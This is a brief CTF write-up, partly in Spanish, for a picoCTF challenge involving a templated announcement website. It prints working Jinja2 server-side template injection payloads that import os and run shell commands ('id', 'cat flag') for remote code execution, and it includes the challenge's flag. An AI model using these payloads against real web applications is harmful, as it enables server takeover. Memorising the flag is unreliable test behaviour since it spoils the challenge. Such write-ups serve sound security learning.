#### Description

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:55806/)!



# Solución 

[Server Side Template Injection with Jinja2 for you now](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

RCE bypassing as much as I possibly can.

````
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

cambiar lo de "id " por "cat flag"

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}


# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}



```